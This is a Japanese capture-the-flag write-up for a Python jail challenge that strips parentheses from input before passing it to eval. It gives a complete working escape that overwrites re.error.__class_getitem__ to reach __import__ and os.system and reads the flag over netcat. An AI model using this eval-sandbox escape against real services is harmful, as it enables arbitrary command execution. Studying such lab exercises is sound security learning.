# ■ ＼^o^／
[＼^o^／ - AlpacaHack](https://alpacahack.com/daily/challenges/no-parentheses)

## 1. Writeup

### 1.1. 概要

`jail.py`:
```python:jail.py
# python -S jail.py
import re
eval(re.sub(r"[()]", "", input("> ")))
```

ユーザ入力から `(` , `)` を取り除いたうえで `eval` するPyjail問題.
`-S` オプションを付与して実行しているため, `site` モジュール( `help` など)を扱えない点に注意する.

最終的に丸括弧を使わずに `os.system` などのACEを達成したい.

### 1.2. 属性代入

```python
[d.x for d.x in [5]]
```

`()`を使わずに属性や添字に代入できる.

### 1.3. `re`モジュール
`jail.py` が `import re` している点から, `re` モジュール内のオブジェクトにアクセスできる. クラス属性を書き換えられるクラスを見つけるため, C実装ではなくPythonクラスを探す.

`re.error` はPythonクラス(Exceptionのサブクラス)として実装されているため, 書き換え可能.

### 1.4. 解法
#### 1.4.1. `re.error.__class_getitem__` を `__import__ に書き換える
 `re.error` はクラスそのものなので, 構文 `re.error[...]` は `__class_getitem__` を呼び出す. これを `__import__` に書き換える.

```python
[re.error for re.error.__class_getitem__ in [__import__]]
```

これによって `re.error['os']` が `__import__('os')` と等価になるため,  `()` なしで `os` モジュールを取得できる.

#### 1.4.2. `os` モジュールをグローバル変数に保存
`for` での代入は内包表記のローカルスコープで閉じるため, walrus演算子 `:=` による単純名への代入でグローバルスコープに保存する.

```python
[osmod := re.error['os']]
```

#### 1.4.3. `re.error.__class_getitem__` を `os.system` に書き換え

```python
[re.error for re.error.__class_getitem__ in [osmod.system]]
```

#### 1.4.4. RCE

```python
re.error['cat ./flag.txt']
```

これで `os.system('cat ./flag.txt')` が実行される.

### 1.5. 動作確認

```bash
>>> import re
>>> [re.error for re.error.__class_getitem__ in [__import__]]
[<class 're.PatternError'>]
>>> [osmod:=re.error['os']]
[<module 'os' (frozen)>]
>>> [re.error for re.error.__class_getitem__ in [osmod.system]]
[<class 're.PatternError'>]
>>> re.error['echo Hello, Pyjail without parentheses']
Hello, Pyjail without parentheses
0
```

### 1.6. ペイロード
以上を踏まえ, 以下の入力を渡せばよい.

```python
[re.error for re.error.__class_getitem__ in[__import__]],[osmod:=re.error['os']],[re.error for re.error.__class_getitem__ in[osmod.system]],re.error['cat ./flag.txt']
```

```bash
$ nc localhost 1337
> [re.error for re.error.__class_getitem__ in[__import__]],[osmod:=re.error['os']],[re.error for re.error.__class_getitem__ in[osmod.system]],re.error['cat flag.txt']
Alpaca{REDACTED}
```

## 2. 備考
今回はすべてClaudeに頼って解きました. 他にも解法はあるかもしれません.
